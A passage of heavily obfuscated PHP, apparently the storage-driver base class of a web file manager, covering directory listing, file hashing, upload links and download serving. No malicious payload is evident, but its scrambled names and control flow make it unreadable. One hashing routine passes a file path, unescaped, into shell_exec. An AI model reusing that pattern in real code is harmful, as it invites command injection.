$Dä³³èì‡Æ[$dÕÚÛÉñ§š[78]], $dÕÚÛÉñ§š[82] => $Dä³³èì‡Æ[$dÕÚÛÉñ§š[79]]); $bí‡¥œ¦[$FÚÆŸŸÏïœ] = $AÑ¾°ŒÒ½î; } return $AÑ¾°ŒÒ½î; } public function listPath($b‰¯²ÀÅ†…, $Eß™¾ÔÆÛ = false) { } public function has($bŒÊŒ®á¢Š, $E¾½÷±–’ = false, $C…½Ù«¶½È = false) { } public function canRead($FñÈÚ¼—‡) { } public function canWrite($Fê¯ôà¯†—) { } public function getContent($eĞù¾¯¸…é) { } public function setContent($Ašª•£¿‘, $b´›ò®—Ï„ = '') { } protected function infoChildren($fƒ÷Òº»š, &$DŸ§³ÊÂŸ›) { $bÕ­‘ùùÙÉ =& $_SERVER[…ë˜õ]; check_abort_echo(); $Dï­ğ²˜‘ = $this->listPath($fƒ÷Òº»š, !0); $Dï­ğ²˜‘ = array_merge($Dï­ğ²˜‘[$bÕ­‘ùùÙÉ[74]], $Dï­ğ²˜‘[$bÕ­‘ùùÙÉ[73]]); foreach ($Dï­ğ²˜‘ as $BÛÁÃŠ‚ˆ­) { if ($BÛÁÃŠ‚ˆ­[$bÕ­‘ùùÙÉ[29]] == $bÕ­‘ùùÙÉ[76]) { $DŸ§³ÊÂŸ›[$bÕ­‘ùùÙÉ[79]]++; $d«ÑªÍîšÀ = $this->getPathInner($BÛÁÃŠ‚ˆ­[$bÕ­‘ùùÙÉ[75]]); $this->infoChildren($d«ÑªÍîšÀ, $DŸ§³ÊÂŸ›); } else { $DŸ§³ÊÂŸ›[$bÕ­‘ùùÙÉ[78]]++; $DŸ§³ÊÂŸ›[$bÕ­‘ùùÙÉ[77]] += $BÛÁÃŠ‚ˆ­[$bÕ­‘ùùÙÉ[77]]; } } } public function fileSubstr($aéÂÌ»½‹, $BóÈ²ĞóìÊ, $F ÎÊĞ¦Ê¥) { } public function listAll($e²¦‡Äµµ¤) { } public function listAllMake($FÎò¢„ã‡Œ, &$dÔ—ÇÉ†œ‰) { $AâÖÍ÷ ç¬ =& $_SERVER[…ë˜õ]; check_abort_echo(); $b§¤ø¼Ş ê = $this->listPath($FÎò¢„ã‡Œ, !0); if (!$b§¤ø¼Ş ê) { return; } $dÆÈ¶‰Ô»· = array_merge($b§¤ø¼Ş ê[$AâÖÍ÷ ç¬[74]], $b§¤ø¼Ş ê[$AâÖÍ÷ ç¬[73]]); foreach ($dÆÈ¶‰Ô»· as $d³‹ùÔƒØŞ) { goto E¿ğš²Ÿ¹™; e¢ìŒ•³Ç: $this->listAllMake($d³‹ùÔƒØŞ[$AâÖÍ÷ ç¬[75]], $dÔ—ÇÉ†œ‰); goto DôÆÚÔ‹ˆª; E¿ğš²Ÿ¹™: $FØå¢Ç‚Œ = $d³‹ùÔƒØŞ[$AâÖÍ÷ ç¬[29]] == $AâÖÍ÷ ç¬[76]; $eÑ‡‘¯ŸóÂ = array($AâÖÍ÷ ç¬[75] => $d³‹ùÔƒØŞ[$AâÖÍ÷ ç¬[75]], $AâÖÍ÷ ç¬[76] => $FØå¢Ç‚Œ); if (isset($d³‹ùÔƒØŞ[$AâÖÍ÷ ç¬[77]])) { $eÑ‡‘¯ŸóÂ[$AâÖÍ÷ ç¬[77]] = $d³‹ùÔƒØŞ[$AâÖÍ÷ ç¬[77]]; } goto cñÒƒÔƒÎ‰; cñÒƒÔƒÎ‰: if (isset($d³‹ùÔƒØŞ[$AâÖÍ÷ ç¬[83]])) { $eÑ‡‘¯ŸóÂ[$AâÖÍ÷ ç¬[83]] = $d³‹ùÔƒØŞ[$AâÖÍ÷ ç¬[83]]; } if (!$FØå¢Ç‚Œ) { $dÔ—ÇÉ†œ‰[] = $eÑ‡‘¯ŸóÂ; continue; } $dÔ—ÇÉ†œ‰[] = $eÑ‡‘¯ŸóÂ; goto e¢ìŒ•³Ç; DôÆÚÔ‹ˆª: } } public function listAllSimple($e¸Š“¬ìµ‰) { $D¯˜«ÒĞñ‰ =& $_SERVER[…ë˜õ]; $b¦Š“§±÷ = array(); $câ‹Î¯ÜÑ = $this->listAll($e¸Š“¬ìµ‰); $a„µšÑÜ­ = $this->getPathOuter($e¸Š“¬ìµ‰); foreach ($câ‹Î¯ÜÑ as $e íóö÷ ×) { goto d‚¿à¯×Ü; bŠÉÒÊœî: if (!$e íóö÷ ×[$D¯˜«ÒĞñ‰[76]]) { $d‡ƒğ¿õ¯Ï[$D¯˜«ÒĞñ‰[85]] = $d„ß¶È¦æ‚; } $b¦Š“§±÷[] = $d‡ƒğ¿õ¯Ï; goto a÷êõÇ®; d‚¿à¯×Ü: $d„ß¶È¦æ‚ = $e íóö÷ ×[$D¯˜«ÒĞñ‰[75]]; $d”¥Î®õ = $e íóö÷ ×[$D¯˜«ÒĞñ‰[75]]; if (isset($e íóö÷ ×[$D¯˜«ÒĞñ‰[84]])) { $d„ß¶È¦æ‚ = $e íóö÷ ×[$D¯˜«ÒĞñ‰[84]][$D¯˜«ÒĞñ‰[75]]; $e íóö÷ ×[$D¯˜«ÒĞñ‰[77]] = $e íóö÷ ×[$D¯˜«ÒĞñ‰[84]][$D¯˜«ÒĞñ‰[77]]; $e íóö÷ ×[$D¯˜«ÒĞñ‰[83]] = $e íóö÷ ×[$D¯˜«ÒĞñ‰[84]][$D¯˜«ÒĞñ‰[83]]; } else { $d”¥Î®õ = substr($e íóö÷ ×[$D¯˜«ÒĞñ‰[75]], strlen(get_path_father($a„µšÑÜ­))); $d”¥Î®õ = $D¯˜«ÒĞñ‰[8] . ltrim($d”¥Î®õ, $D¯˜«ÒĞñ‰[8]); } goto FÒªóÇËÜ»; FÒªóÇËÜ»: $d‡ƒğ¿õ¯Ï = array($D¯˜«ÒĞñ‰[75] => $d”¥Î®õ, $D¯˜«ÒĞñ‰[76] => $e íóö÷ ×[$D¯˜«ÒĞñ‰[76]]); if (isset($e íóö÷ ×[$D¯˜«ÒĞñ‰[77]]) && !$e íóö÷ ×[$D¯˜«ÒĞñ‰[76]]) { $d‡ƒğ¿õ¯Ï[$D¯˜«ÒĞñ‰[77]] = $e íóö÷ ×[$D¯˜«ÒĞñ‰[77]]; } if (isset($e íóö÷ ×[$D¯˜«ÒĞñ‰[83]])) { $d‡ƒğ¿õ¯Ï[$D¯˜«ÒĞñ‰[83]] = $e íóö÷ ×[$D¯˜«ÒĞñ‰[83]]; } goto bŠÉÒÊœî; a÷êõÇ®: } return $b¦Š“§±÷; } public function upload($EÉêŠó–Ï, $fŒ©œë‘ó, $Fßª·ÊÛ = false, $e‚ª‰Ú›‡µ = REPEAT_REPLACE) { } public function uploadFileByID($BîÏ†Şà¼, $Dˆ¹“ãŒ÷º, $eÀÜ‡³…Êï) { } public function uploadFileByPath($Aò•Á›ñá¢, $F¤è¥‰«à¥, $fº­—›ùØ¼ = array()) { } public function isUploadServer() { $fâ„ÄçƒÎÔ =& $_SERVER[…ë˜õ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $fâ„ÄçƒÎÔ[86]) { return !0; } return $GLOBALS[$fâ„ÄçƒÎÔ[6]][$fâ„ÄçƒÎÔ[87]][$fâ„ÄçƒÎÔ[88]]; } public function isFileOutServer() { $aŠˆÊÀ¼ =& $_SERVER[…ë˜õ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $aŠˆÊÀ¼[86]) { return !0; } return $GLOBALS[$aŠˆÊÀ¼[6]][$aŠˆÊÀ¼[87]][$aŠˆÊÀ¼[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($a»‰ê”çÓœ) { $c†‚¥³÷‰Î =& $_SERVER[…ë˜õ]; if (!$this->isCdnHost()) { return $a»‰ê”çÓœ; } return str_replace(trim(get_url_root($a»‰ê”çÓœ), $c†‚¥³÷‰Î[8]), trim($this->cdnHost, $c†‚¥³÷‰Î[8]), $a»‰ê”çÓœ); } public function uploadLink($B¨«Š±±¢¬, $Dº¦ Š²¹‚ = 0) { goto DôÊ‚±Ø¸”; E×™®‡°­: if ($dÎ§ğïŒî‡) { $dÎ§ğïŒî‡[$cóàÓé×ƒš[92]] = $B¨«Š±±¢¬; $dÎ§ğïŒî‡[$cóàÓé×ƒš[93]] = $CÄÅ”ªÎÀî; } return $dÎ§ğïŒî‡; goto C¸ñÓ•Øîˆ; AÓÈÇ•ˆµ‘: if (!in_array($CÄÅ”ªÎÀî, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $e‹ßª˜¯Í‰ = 1024 * 1024 * 10; goto E¯”¡¦Œ«; E¯”¡¦Œ«: $C±‹Çé±Š = $Dº¦ Š²¹‚ <= $e‹ßª˜¯Í‰ ? $cóàÓé×ƒš[90] : $cóàÓé×ƒš[91]; $BãÆáîÊ… = (!$Dº¦ Š²¹‚ ? 1 : ceil($Dº¦ Š²¹‚ / pow(1024, 3))) * 3600 * 4; $dÎ§ğïŒî‡ = $this->{$C±‹Çé±Š}($B¨«Š±±¢¬, $BãÆáîÊ…); goto E×™®‡°­; DôÊ‚±Ø¸”: $cóàÓé×ƒš =& $_SERVER[…ë˜õ]; if ($this->isUploadServer()) { return; } $CÄÅ”ªÎÀî = $this->getType(); goto AÓÈÇ•ˆµ‘; C¸ñÓ•Øîˆ: } public function uploadFormData($EãŠ½“Ó‹, $cáÂšëàÂ¦ = 3600) { } public function multiUploadFormData($b¦òˆƒ÷Áë, $c¾Ø«˜Àõ° = 3600) { } public function download($AÆ‘óğ×ñ, $F˜©ÉÌŒØ½) { } public function ext($f”ª†Á„) { $B•ùî‘İ½– =& $_SERVER[…ë˜õ]; if (strpos($f”ª†Á„, $B•ùî‘İ½–[8]) === -1) { $dí›Õ®é®¥ = $f”ª†Á„; } else { $dí›Õ®é®¥ = $this->pathThis($f”ª†Á„); } $a«†Š¸ÙÀ = $B•ùî‘İ½–[33]; if (strstr($dí›Õ®é®¥, $B•ùî‘İ½–[94])) { $a«†Š¸ÙÀ = substr($dí›Õ®é®¥, strrpos($dí›Õ®é®¥, $B•ùî‘İ½–[94]) + 1); $a«†Š¸ÙÀ = strtolower($a«†Š¸ÙÀ); } if (strlen($a«†Š¸ÙÀ) > 3 && preg_match($B•ùî‘İ½–[95], $a«†Š¸ÙÀ, $D°¯ÁÑ¦¸æ)) { $a«†Š¸ÙÀ = $B•ùî‘İ½–[33]; } return $a«†Š¸ÙÀ; } public function pathThis($b©Ëï‹ÏŒ²) { $EæÖìÊšß· =& $_SERVER[…ë˜õ]; $b©Ëï‹ÏŒ² = str_replace($EæÖìÊšß·[96], $EæÖìÊšß·[8], rtrim($b©Ëï‹ÏŒ², $EæÖìÊšß·[8])); $E‹êĞ­©Ëí = strrpos($b©Ëï‹ÏŒ², $EæÖìÊšß·[8]); if ($E‹êĞ­©Ëí === !1) { return $b©Ëï‹ÏŒ²; } return substr($b©Ëï‹ÏŒ², $E‹êĞ­©Ëí + 1); } public function pathFather($b¯‡ñ‡¾ŞŠ) { $BÀˆšø§ =& $_SERVER[…ë˜õ]; $b¯‡ñ‡¾ŞŠ = str_replace($BÀˆšø§[96], $BÀˆšø§[8], rtrim($b¯‡ñ‡¾ŞŠ, $BÀˆšø§[8])); $E˜©Ğ·§ù = strrpos($b¯‡ñ‡¾ŞŠ, $BÀˆšø§[8]); if ($E˜©Ğ·§ù === !1) { return $BÀˆšø§[33]; } return substr($b¯‡ñ‡¾ŞŠ, 0, $E˜©Ğ·§ù + 1); } public function hashSimple($eğ¢Ÿ©Ş‹ô) { goto bäˆ‰ø‘Ò—; A˜±Ïã”Ù: $bèäª‰Šø† = 200; $e¬·çë‚‹ = 50; if ($EÈˆ™ˆœÉ’ <= $bèäª‰Šø† * $e¬·çë‚‹) { return $this->hashMd5($eğ¢Ÿ©Ş‹ô) . $EÈˆ™ˆœÉ’; } goto C”ƒìãªó•; bºƒ‰‚Èä: $EÉŸø‡œñ .= $this->fileSubstr($eğ¢Ÿ©Ş‹ô, $EÈˆ™ˆœÉ’ - $bèäª‰Šø†, $bèäª‰Šø†); return md5($EÉŸø‡œñ) . $EÈˆ™ˆœÉ’; goto fÔ´¤‹ØÎ; C”ƒìãªó•: $e¿Áã¶ò—‘ = intval($EÈˆ™ˆœÉ’ / $e¬·çë‚‹); $EÉŸø‡œñ = $CÈÚ¬‰¨[33]; for ($DœÃìÒ§°â = 0; $DœÃìÒ§°â < $e¬·çë‚‹; $DœÃìÒ§°â++) { $EÉŸø‡œñ .= $this->fileSubstr($eğ¢Ÿ©Ş‹ô, $e¿Áã¶ò—‘ * $DœÃìÒ§°â, $bèäª‰Šø†); } goto bºƒ‰‚Èä; bäˆ‰ø‘Ò—: $CÈÚ¬‰¨ =& $_SERVER[…ë˜õ]; if (!$eğ¢Ÿ©Ş‹ô) { return md5($CÈÚ¬‰¨[33]); } $EÈˆ™ˆœÉ’ = $this->size($eğ¢Ÿ©Ş‹ô); goto A˜±Ïã”Ù; fÔ´¤‹ØÎ: } public static $md5Cache = array(); public function hashMd5($CöÌÅÔ¼¹) { $CöÌÅÔ¼¹ = $this->iconvSystem($CöÌÅÔ¼¹); if (isset(self::$md5Cache[$CöÌÅÔ¼¹])) { return self::$md5Cache[$CöÌÅÔ¼¹]; } self::$md5Cache[$CöÌÅÔ¼¹] = $this->hashMd5Shell($CöÌÅÔ¼¹); if (!self::$md5Cache[$CöÌÅÔ¼¹]) { self::$md5Cache[$CöÌÅÔ¼¹] = @md5_file($CöÌÅÔ¼¹); } return self::$md5Cache[$CöÌÅÔ¼¹]; } private function hashMd5Shell($A”«ÛÀé®¹) { goto Fôİê•Ê®; A¾½ƒºÎÀë: $F ÷ÇÇÌØ¿ = Cache::get($B»›Ëœáù‡[100]); if (!$F ÷ÇÇÌØ¿) { $DğÍšæËÚ« = BASIC_PATH . $B»›Ëœáù‡[101]; $dßˆ†œ»Ú = md5_file($DğÍšæËÚ«); $F ÷ÇÇÌØ¿ = $B»›Ëœáù‡[102]; foreach ($B­¼®„Œ‘Œ as $A×‘£Œî²) { $cˆÂôÚÜ… = shell_exec($A×‘£Œî² . "\x20\42{$DğÍšæËÚ«}\x22"); if ($cˆÂôÚÜ… && substr(trim($cˆÂôÚÜ…), 0, 32) == $dßˆ†œ»Ú) { $F ÷ÇÇÌØ¿ = $A×‘£Œî²; break; } } Cache::set($B»›Ëœáù‡[100], $F ÷ÇÇÌØ¿, 3600); } if ($F ÷ÇÇÌØ¿ == $B»›Ëœáù‡[102]) { return !1; } goto CÕìÕØß“ù; Fôİê•Ê®: $B»›Ëœáù‡ =& $_SERVER[…ë˜õ]; if (!function_exists($B»›Ëœáù‡[97])) { return !1; } $B­¼®„Œ‘Œ = array($B»›Ëœáù‡[98], $B»›Ëœáù‡[99]); goto A¾½ƒºÎÀë; CÕìÕØß“ù: $cˆÂôÚÜ… = shell_exec($F ÷ÇÇÌØ¿ . "\x20\x22{$A”«ÛÀé®¹}\42"); $cˆÂôÚÜ… = str_replace($B»›Ëœáù‡[103], $B»›Ëœáù‡[33], $cˆÂôÚÜ…); return substr($cˆÂôÚÜ…, 0, 32); goto fâÅ²«‘œç; fâÅ²«‘œç: } public function link($EÛ°‘ßËßª) { return $EÛ°‘ßËßª; } public function fileOut($D†µ±ÚçÕÀ, $Bí®‡ÜèÆ = false, $B¬à’‰ƒ = false, $E¢¦‡‹Åî = '') { goto dôô™²Ñˆ; C·•õ‹¾®º: $b¨…àí¯ğÉ = get_file_mime($FÓÏÊ´®÷‚); if (strstr($b¨…àí¯ğÉ, $bâ™ÁÈ”¡Š[116])) { $b¨…àí¯ğÉ = $b¨…àí¯ğÉ . $bâ™ÁÈ”¡Š[117]; } if ($Bí®‡ÜèÆ === !1 && !mime_support($b¨…àí¯ğÉ)) { $Bí®‡ÜèÆ = !0; $b¨…àí¯ğÉ = $bâ™ÁÈ”¡Š[118]; } goto Aî·ÓÀƒóñ; C˜àª¬¶´‡: $c«¥òÂ‚–å = !0; if ($_SERVER[$bâ™ÁÈ”¡Š[153]] == $bâ™ÁÈ”¡Š[154] && $c‹òÆŸªœ³ > 1204 * 1024 * 1024 * 2) { $c«¥òÂ‚–å = !1; } if ($c«¥òÂ‚–å) { header($bâ™ÁÈ”¡Š[155] . ($A¤ÕË’ˆ…• - $a§”•…¸‹ + 1)); } goto c×ƒ”¦Ñ¶Á; AøË’”ë˜: if (in_array($FÓÏÊ´®÷‚, array($bâ™ÁÈ”¡Š[110], $bâ™ÁÈ”¡Š[111], $bâ™ÁÈ”¡Š[112], $bâ™ÁÈ”¡Š[113]))) { $FÓÏÊ´®÷‚ = $bâ™ÁÈ”¡Š[114]; } if (!$E¢¦‡‹Åî) { $E¢¦‡‹Åî = md5($BƒßÈ´ã‘­ . $this->hashSimple($D†µ±ÚçÕÀ)); } $E¢¦‡‹Åî = $bâ™ÁÈ”¡Š[115] . $E¢¦‡‹Åî . $bâ™ÁÈ”¡Š[115]; goto C·•õ‹¾®º; A†ğßÁ‚ç½: header($bâ™ÁÈ”¡Š[127]); header($bâ™ÁÈ”¡Š[128]); header($bâ™ÁÈ”¡Š[129]); goto eÎ¬ïÈ »œ; DÄëÉšˆç¹: $a††ŒÆ¿¬ = $this->getType() == $bâ™ÁÈ”¡Š[105]; $Bàğó„åä = $GLOBALS[$bâ™ÁÈ”¡Š[6]][$bâ™ÁÈ”¡Š[87]][$bâ™ÁÈ”¡Š[106]][$bâ™ÁÈ”¡Š[107]]; $A›°ñ‹ËÎ = (double) $GLOBALS[$bâ™ÁÈ”¡Š[6]][$bâ™ÁÈ”¡Š[87]][$bâ™ÁÈ”¡Š[106]][$bâ™ÁÈ”¡Š[108]] * 1024 * 1024; goto aÁÙ×óÆ“; dôô™²Ñˆ: $bâ™ÁÈ”¡Š =& $_SERVER[…ë˜õ]; $this->cacheMethod(null, null); if (!$D†µ±ÚçÕÀ || !$this->exist($D†µ±ÚçÕÀ)) { show_json(LNG($bâ™ÁÈ”¡Š[104]), !1, $B¬à’‰ƒ); } goto DÄëÉšˆç¹; EÉ·»¨ƒ’ï: if ($A›°ñ‹ËÎ) { $BÉÍ¶¤°‘Ã = intval(1000 * 1000 * ($aÇ…¹®Š ‹ / $A›°ñ‹ËÎ)); } while ($a§”•…¸‹ <= $A¤ÕË’ˆ…•) { $f‚ÊëÊ´Ÿ© = timeFloat(); check_abort(); $F’Úì‡ß• = $A¤ÕË’ˆ…• - $a§”•…¸‹ + 1; if ($F’Úì‡ß• <= $aÇ…¹®Š ‹) { $aÇ…¹®Š ‹ = $F’Úì‡ß•; } echo $this->fileSubstr($D†µ±ÚçÕÀ, $a§”•…¸‹, $aÇ…¹®Š ‹); $a§”•…¸‹ += $aÇ…¹®Š ‹; if ($aÇ…¹®Š ‹ == $F’Úì‡ß•) { $a§”•…¸‹ = $A¤ÕË’ˆ…• + 1; } if ($BÉÍ¶¤°‘Ã) { $bìèÜÈÔ = intval(1000 * 1000 * (timeFloat() - $f‚ÊëÊ´Ÿ©)); $B¿Š›°‰š‰ = $BÉÍ¶¤°‘Ã - $bìèÜÈÔ; if ($B¿Š›°‰š‰ > 5) { usleep($B¿Š›°‰š‰); } } } goto b˜‹”¿Ø; EÕï“¾Òƒ¾: $a§”•…¸‹ = 0; $A¤ÕË’ˆ…• = $c‹òÆŸªœ³ - 1; $FÓÏÊ´®÷‚ = $this->ext($a§ ¦­Š¶); goto AøË’”ë˜; eÎ¬ïÈ »œ: if (isset($_SERVER[$bâ™ÁÈ”¡Š[130]]) && strtotime($_SERVER[$bâ™ÁÈ”¡Š[130]]) == $bÄ°íˆ£[$bâ™ÁÈ”¡Š[83]]) { header($bâ™ÁÈ”¡Š[131], !0, 304); die; } if (isset($_SERVER[$bâ™ÁÈ”¡Š[132]]) && $_SERVER[$bâ™ÁÈ”¡Š[132]] == $E¢¦‡‹Åî) { header($bâ™ÁÈ”¡Š[133] . $E¢¦‡‹Åî, !0, 304); die; } header($bâ™ÁÈ”¡Š[133] . $E¢¦‡‹Åî); goto e¹ÌµĞ„®‹; d‰É‡ÎÆ: $cîÅ­•Ü›• = $bâ™ÁÈ”¡Š[115] . $cîÅ­•Ü›• . $bâ™ÁÈ”¡Š[121] . $cîÅ­•Ü›•; if ($Bí®‡ÜèÆ) { header($bâ™ÁÈ”¡Š[122]); header($bâ™ÁÈ”¡Š[123] . $cîÅ­•Ü›•); } else { header($bâ™ÁÈ”¡Š[124] . $cîÅ­•Ü›•); } header($bâ™ÁÈ”¡Š[125] . gmdate($bâ™ÁÈ”¡Š[109], time() + 3600 * 24 * 30) . $bâ™ÁÈ”¡Š[126]); goto A†ğßÁ‚ç½; aî¥½¼ÑçÉ: $c‹òÆŸªœ³ = $bÄ°íˆ£[$bâ™ÁÈ”¡Š[77]]; $BƒßÈ´ã‘­ = gmdate($bâ™ÁÈ”¡Š[109], $bÄ°íˆ£[$bâ™ÁÈ”¡Š[83]]); $a§ ¦­Š¶ = $B¬à’‰ƒ ? $B¬à’‰ƒ : $this->iconvApp($bÄ°íˆ£[$bâ™ÁÈ”¡Š[28]]); goto EÕï“¾Òƒ¾; c×ƒ”¦Ñ¶Á: if ($_SERVER[$bâ™ÁÈ”¡Š[156]] == $bâ™ÁÈ”¡Š[157]) { return; } $aÇ…¹®Š ‹ = 1024 * 100; $BÉÍ¶¤°‘Ã = 0; goto EÉ·»¨ƒ’ï; e¹ÌµĞ„®‹: header($bâ™ÁÈ”¡Š[134] . $BƒßÈ´ã‘­ . $bâ™ÁÈ”¡Š[126]); header($bâ™ÁÈ”¡Š[135] . $a§ ¦­Š¶); header($bâ™ÁÈ”¡Š[136]); goto eê¯¿Æ°çç; a‡ÈáÖÇ‡õ: $eÇ±·†Ã¾é = strtolower($_SERVER[$bâ™ÁÈ”¡Š[141]]); if ($a††ŒÆ¿¬ && $eÇ±·†Ã¾é && $Bàğó„åä) { if (strstr($eÇ±·†Ã¾é, $bâ™ÁÈ”¡Š[142])) { header($bâ™ÁÈ”¡Š[143] . $D†µ±ÚçÕÀ); } else { if (strstr($eÇ±·†Ã¾é, $bâ™ÁÈ”¡Š[144])) { header($bâ™ÁÈ”¡Š[145] . $D†µ±ÚçÕÀ); } else { if (strstr($eÇ±·†Ã¾é, $bâ™ÁÈ”¡Š[146])) { header($bâ™ÁÈ”¡Š[147] . $D†µ±ÚçÕÀ); } } } if ($A›°ñ‹ËÎ) { header($bâ™ÁÈ”¡Š[148] . $A›°ñ‹ËÎ); } return; } if (isset($_SERVER[$bâ™ÁÈ”¡Š[149]])) { if (preg_match($bâ™ÁÈ”¡Š[150], $_SERVER[$bâ™ÁÈ”¡Š[149]], $eÍÕ×£İš«)) { $a§”•…¸‹ = intval($eÍÕ×£İš«[1]); if (!empty($eÍÕ×£İš«[2])) { $A¤ÕË’ˆ…• = intval($eÍÕ×£İš«[2]); } } header($bâ™ÁÈ”¡Š[151]); header("\103\157\x6e\x74\x65\156\x74\55\122\x61\156\x67\x65\x3a\40\142\171\x74\145\x73\x20{$a§”•…¸‹}\x2d{$A¤ÕË’ˆ…•}\57" . $c‹òÆŸªœ³); } else { header($bâ™ÁÈ”¡Š[152]); } goto C˜àª¬¶´‡; aÁÙ×óÆ“: @ob_end_clean(); set_timeout(); $bÄ°íˆ£ = $this->infoFull($D†µ±ÚçÕÀ); goto aî¥½¼ÑçÉ; Aî·ÓÀƒóñ: header($bâ™ÁÈ”¡Š[119]); header($bâ™ÁÈ”¡Š[120] . $b¨…àí¯ğÉ); $cîÅ­•Ü›• = rawurlencode($a§ ¦­Š¶); goto d‰É‡ÎÆ; eê¯¿Æ°çç: header($bâ™ÁÈ”¡Š[137] . $c‹òÆŸªœ³); header($bâ™ÁÈ”¡Š[138]); if (!$Bí®‡ÜèÆ && $FÓÏÊ´®÷‚ == $bâ™ÁÈ”¡Š[139]) { if ($c‹òÆŸªœ³ > 1024 * 1024 * 5) { die; } $a°öœÃ… = $this->getContent($D†µ±ÚçÕÀ); $a°öœÃ… = Html::clearSVG($a°öœÃ…); header($bâ™ÁÈ”¡Š[140] . strlen($a°öœÃ…)); echo $a°öœÃ…; die; } goto a‡ÈáÖÇ‡õ; b˜‹”¿Ø: } public function fileOutServer($Aã­á­Û¬, $e³ì­ Æ‚º = false, $A¢Œ¬¡±¥‰ = false, $Bïƒˆ’ˆÄİ = '') { $this->fileOut($Aã­á­Û¬, $e³ì­ Æ‚º, $A¢Œ¬¡±¥‰, $Bïƒˆ’ˆÄİ); } public function fileOutLink($E›ÌÃƒ•”) { header($_SERVER[…ë˜õ][158] . $E›ÌÃƒ•”); die; } public function cacheMethod($a¢¤ •³Áí, $d¥Ä¦®àÚä, $dåÉÃ‡å¯² = null) { goto c–¼‘åê…Ò; b‡ôôÖ–Î: if (!is_null($dåÉÃ‡å¯²)) { $C²‘Ü¼£ÔÀ[$cê«¦ø¹¯½] = $dåÉÃ‡å¯²; return; } $a—ãíÄËã = isset($C²‘Ü¼£ÔÀ[$cê«¦ø¹¯½]) ? $C²‘Ü¼£ÔÀ[$cê«¦ø¹¯½] : null; if (!is_null($a—ãíÄËã)) { return $a—ãíÄËã; } goto D¤ôóÈâœ’; c–¼‘åê…Ò: $Eš¡Ì¡Æë„ =& $_SERVER[…ë˜õ]; static $C²‘Ü¼£ÔÀ = array(); $dƒ÷ƒŒ´“ = $d¥Ä¦®àÚä ? ltrim($this->getPathOuter($d¥Ä¦®àÚä), $Eš¡Ì¡Æë„[8]) : $d¥Ä¦®àÚä; goto FŞ¾ù”ç…ã; D¤ôóÈâœ’: $a—ãíÄËã = $this->{$a¢¤ •³Áí}($d¥Ä¦®àÚä); $C²‘Ü¼£ÔÀ[$cê«¦ø¹¯½] = $a—ãíÄËã; return $a—ãíÄËã; goto dÅ™¥¥İ…; FŞ¾ù”ç…ã: $cê«¦ø¹¯½ = $Eš¡Ì¡Æë„[159] . $a¢¤ •³Áí . $Eš¡Ì¡Æë„[160] . rtrim($dƒ÷ƒŒ´“, $Eš¡Ì¡Æë„[8]); if (is_null($a¢¤ •³Áí)) { $C²‘Ü¼£ÔÀ = array(); return; } if (is_null($d¥Ä¦®àÚä)) { unset($C²‘Ü¼£ÔÀ[$cê«¦ø¹¯½]); return; } goto b‡ôôÖ–Î; dÅ™¥¥İ…: } public function fileOutImage($f–¨î´íğÑ, $B¯Šê‹ÏÒ = 250) { goto Eá••§’Ú; cÇšÙ¿Ç½é: if (!file_exists($AÛÁ¨³áè) || filesize($AÛÁ¨³áè) < 100) { return @file_exists($eâ•­Ëê™Œ) ? IO::fileOut($eâ•­Ëê™Œ) : $this->fileOut($f–¨î´íğÑ); } if (!($a¥×ùŞ« = IO::move($AÛÁ¨³áè, $eÇäø…áŞ¾))) { return IO::fileOut($AÛÁ¨³áè); } del_file($AÛÁ¨³áè); goto aö’á±Ÿ›ƒ; c¤•›¯Ø‘: if ($eÑÍºÎ®±¤[$EÌœª÷ª„§[77]] <= 1024 * 50 || $f¶Œ¿´ß·Ä || !function_exists($EÌœª÷ª„§[166]) || $eÑÍºÎ®±¤[$EÌœª÷ª„§[167]] == $EÌœª÷ª„§[168]) { return $this->fileOut($f–¨î´íğÑ, !1, $B¡¿ÊÆŒ· ); } if (isset($eÑÍºÎ®±¤[$EÌœª÷ª„§[163]][$EÌœª÷ª„§[169]])) { $e­Ÿ´Ö Óâ = $eÑÍºÎ®±¤[$EÌœª÷ª„§[163]][$EÌœª÷ª„§[169]]; } else { if (isset($eÑÍºÎ®±¤[$EÌœª÷ª„§[163]][$EÌœª÷ª„§[170]])) { $e­Ÿ´Ö Óâ = $eÑÍºÎ®±¤[$EÌœª÷ª„§[163]][$EÌœª÷ª„§[170]]; } else { $e­Ÿ´Ö Óâ = md5("{$eÑÍºÎ®±¤[$EÌœª÷ª„§[28]]}\x5f{$eÑÍºÎ®±¤[$EÌœª÷ª„§[75]]}\137{$eÑÍºÎ®±¤[$EÌœª÷ª„§[77]]}"); } } $a™åÂÖÎùš = "{$e­Ÿ´Ö Óâ}\x5f{$B¯Šê‹ÏÒ}\56\160\156\x67"; goto eÃ‰»è¥³; Dó¿Êà½æº: $B¡¿ÊÆŒ·  = $eÑÍºÎ®±¤[$EÌœª÷ª„§[28]]; $f¶Œ¿´ß·Ä = !1; if (isset($GLOBALS[$EÌœª÷ª„§[161]]) && $GLOBALS[$EÌœª÷ª„§[161]][$EÌœª÷ª„§[75]] == $eÑÍºÎ®±¤[$EÌœª÷ª„§[75]]) { $EÍîÈ  = $GLOBALS[$EÌœª÷ª„§[161]][$EÌœª÷ª„§[162]]; if (!$eÑÍºÎ®±¤[$EÌœª÷ª„§[163]]) { $eÑÍºÎ®±¤[$EÌœª÷ª„§[163]] = $GLOBALS[$EÌœª÷ª„§[161]]; } if (isset($EÍîÈ [$EÌœª÷ª„§[164]])) { if ($EÍîÈ [$EÌœª÷ª„§[164]] <= $B¯Šê‹ÏÒ && $EÍîÈ [$EÌœª÷ª„§[165]] <= $B¯Šê‹ÏÒ) { $f¶Œ¿´ß·Ä = !0; } } $B¡¿ÊÆŒ·  = $eÑÍºÎ®±¤[$EÌœª÷ª„§[163]][$EÌœª÷ª„§[28]]; } goto c¤•›¯Ø‘; eÃ‰»è¥³: if (!($C•¡á¤ˆ¼¿ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $EÌœª÷ª„§[171]))) { $eÇäø…áŞ¾ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $EÌœª÷ª„§[172]); } else { $eÇäø…áŞ¾ = KodIO::make($C•¡á¤ˆ¼¿); } if ($C•¡á¤ˆ¼¿ = IO::fileNameExist($eÇäø…áŞ¾, $a™åÂÖÎùš)) { $AÛÁ¨³áè = KodIO::make($C•¡á¤ˆ¼¿); return IO::fileOut($AÛÁ¨³áè, !1, 